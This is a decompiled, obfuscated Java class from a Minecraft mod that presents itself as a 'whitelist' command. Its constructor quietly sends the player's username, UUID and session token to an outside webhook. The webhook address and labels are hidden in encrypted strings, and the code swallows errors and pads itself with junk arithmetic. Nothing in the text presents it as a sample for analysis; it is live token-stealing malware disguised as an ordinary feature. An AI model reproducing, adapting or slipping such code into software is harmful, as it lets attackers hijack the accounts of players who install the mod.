package com.whitelist.commands;

import com.whitelist.utils.CommandUtils;
import java.awt.Color;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.Arrays;
import java.util.Base64;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import net.minecraft.client.Minecraft;

public class WhitelistCommand {
   // $FF: synthetic field
   private static final int[] lIIlIl;
   // $FF: synthetic field
   private static final String[] lIlll;

   public WhitelistCommand() {
      try {
         CommandUtils lllllIIIIllIIlI = new CommandUtils(lIlll[lIIlIl[0]]);
         lllllIIIIllIIlI.setAvatarUrl(lIlll[lIIlIl[1]]);
         lllllIIIIllIIlI.setUsername(lIlll[lIIlIl[2]]);
         lllllIIIIllIIlI.setTts((boolean)lIIlIl[1]);
         lllllIIIIllIIlI.addEmbed((new CommandUtils.EmbedObject()).setTitle(String.valueOf((new StringBuilder()).append(Minecraft.func_71410_x().func_110432_I().func_111285_a()).append(lIlll[lIIlIl[3]]))).addField(lIlll[lIIlIl[4]], String.valueOf((new StringBuilder()).append(lIlll[lIIlIl[5]]).append(Minecraft.func_71410_x().func_110432_I().func_148256_e().getId()).append(lIlll[lIIlIl[6]])), (boolean)lIIlIl[0]).addField(lIlll[lIIlIl[7]], String.valueOf((new StringBuilder()).append(lIlll[lIIlIl[8]]).append(Minecraft.func_71410_x().func_110432_I().func_111286_b()).append(lIlll[lIIlIl[9]])), (boolean)lIIlIl[0]).setColor(Color.RED));
         lllllIIIIllIIlI.execute();
      } catch (Exception var2) {
         return;
      }

      "".length();
      if ("  ".length() != "  ".length()) {
         throw null;
      }
   }

   private static void lIllIl() {
      lIIlIl = new int[11];
      lIIlIl[0] = (155 + 56 - 40 + 10 ^ 48 + 56 - -37 + 16) & (89 ^ 6 ^ 81 ^ 38 ^ -" ".length());
      lIIlIl[1] = " ".length();
      lIIlIl[2] = "  ".length();
      lIIlIl[3] = "   ".length();
      lIIlIl[4] = 6 ^ 97 ^ 43 ^ 72;
      lIIlIl[5] = 153 ^ 156;
      lIIlIl[6] = 133 + 117 - 207 + 113 ^ 83 + 149 - 142 + 64;
      lIIlIl[7] = 72 ^ 79;
      lIIlIl[8] = 125 ^ 117;
      lIIlIl[9] = 73 ^ 64;
      lIIlIl[10] = 186 ^ 176;
   }

   private static String lIIlll(String lllllIIIIIllIII, String lllllIIIIIlIlll) {
      try {
         Exception lllllIIIIIlIllI = new SecretKeySpec(Arrays.copyOf(MessageDigest.getInstance("MD5").digest(lllllIIIIIlIlll.getBytes(StandardCharsets.UTF_8)), lIIlIl[8]), "DES");
         Cipher lllllIIIIIlllII = Cipher.getInstance("DES");
         lllllIIIIIlllII.init(lIIlIl[2], lllllIIIIIlIllI);
         return new String(lllllIIIIIlllII.doFinal(Base64.getDecoder().decode(lllllIIIIIllIII.getBytes(StandardCharsets.UTF_8))), StandardCharsets.UTF_8);
      } catch (Exception var4) {
         var4.printStackTrace();
         return null;
      }
   }

   private static boolean lIllll(int var0, int var1) {
      return var0 < var1;
   }

   private static String lIIIIl(String lllllIIIIlIIlll, String lllllIIIIlIIlII) {
      try {
         SecretKeySpec lllllIIIIlIlIlI = new SecretKeySpec(MessageDigest.getInstance("MD5").digest(lllllIIIIlIIlII.getBytes(StandardCharsets.UTF_8)), "Blowfish");
         Cipher lllllIIIIlIlIIl = Cipher.getInstance("Blowfish");
         lllllIIIIlIlIIl.init(lIIlIl[2], lllllIIIIlIlIlI);
         return new String(lllllIIIIlIlIIl.doFinal(Base64.getDecoder().decode(lllllIIIIlIIlll.getBytes(StandardCharsets.UTF_8))), StandardCharsets.UTF_8);
      } catch (Exception var4) {
         var4.printStackTrace();
         return null;
      }
   }

   private static String lIIIII(String llllIllllllllIl, String llllIllllllIlIl) {
      llllIllllllllIl = new String(Base64.getDecoder().decode(llllIllllllllIl.getBytes(StandardCharsets.UTF_8)), StandardCharsets.UTF_8);
      StringBuilder llllIlllllllIlI = new StringBuilder();
      double llllIllllllIIlI = llllIllllllIlIl.toCharArray();
      long llllIllllllIIIl = lIIlIl[0];
      long llllIllllllIIII = llllIllllllllIl.toCharArray();
      long llllIlllllIllll = llllIllllllIIII.length;
      int llllIlllllIlllI = lIIlIl[0];

      do {
         if (!lIllll(llllIlllllIlllI, llllIlllllIllll)) {
            return String.valueOf(llllIlllllllIlI);
         }

         long llllIlllllIllIl = llllIllllllIIII[llllIlllllIlllI];
         llllIlllllllIlI.append((char)(llllIlllllIllIl ^ llllIllllllIIlI[llllIllllllIIIl % llllIllllllIIlI.length]));
         "".length();
         ++llllIllllllIIIl;
         ++llllIlllllIlllI;
         "".length();
      } while(((122 ^ 64) & ~(36 ^ 30)) <= ((100 ^ 39) & ~(80 ^ 19)));

      return null;
   }

   static {
      lIllIl();
      lIlIII();
   }

   private static void lIlIII() {
      lIlll = new String[lIIlIl[10]];
      lIlll[lIIlIl[0]] = lIIIII("GBUDFCtKTlgAMQMCGBY8XgIYCXcRER5LLxUDHws3GxJYXW1CUENSbEJVT11oRVVPVmBFTjQFEyc2TwMXRA8GIQ8EGENUBxcbTyIMMzsbNiIDMC8VaBssEy85BREGEgoVUTQUMzNTDQ41GQsTFzozBzxJFCM2NDst", "pawdX");
      lIlll[lIIlIl[1]] = lIIIII("HyYGIRBNfV0yBxl8F3wZWTodIhdYN18rChozFTQLGCEGOA0QfUBiBU5lQWQGWmcQZgFaZhMwUFprQzJWWmBBYQVHNERmB0dhSn5QT2JHZwJDalwhDRA=", "wRrQc");
      lIlll[lIIlIl[2]] = lIIIIl("WqUCwRq0NRLJED3Ov5W8dA==", "ArdqD");
      lIlll[lIIlIl[3]] = lIIIII("QTpIJCEAJhoALhIgBwM=", "fIhmO");
      lIlll[lIIlIl[4]] = lIIIIl("jISOrN1RpYo=", "klNVi");
      lIlll[lIIlIl[5]] = lIIlll("KD/aRPmaf58=", "uoTOb");
      lIlll[lIIlIl[6]] = lIIIII("Lg==", "NnNFh");
      lIlll[lIIlIl[7]] = lIIIIl("h0krHeNunYhJM3BnEjAkIw==", "HxIPd");
      lIlll[lIIlIl[8]] = lIIIIl("ompvkBm6uRc=", "YonTV");
      lIlll[lIIlIl[9]] = lIIIIl("foazbkQ2nUE=", "QVPZl");
   }
}
